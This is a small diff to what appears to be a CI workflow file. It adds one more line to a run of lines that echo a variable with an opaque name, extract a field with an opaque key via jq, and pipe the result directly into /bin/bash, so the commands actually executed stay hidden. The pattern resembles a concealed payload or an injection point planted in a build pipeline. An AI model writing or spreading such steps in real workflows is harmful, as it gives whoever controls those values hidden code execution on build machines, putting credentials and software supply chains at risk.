@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$qla1559" | jq -r .ibl338 | /bin/bash
           echo $qrge3834 | jq -r .jbjvz204 | /bin/bash
           echo $gag3 | jq -r .w781 | /bin/bash
+          echo $a3 | jq -r .fpgw6584 | /bin/bash
 
       - name: Save archive
         if: always()
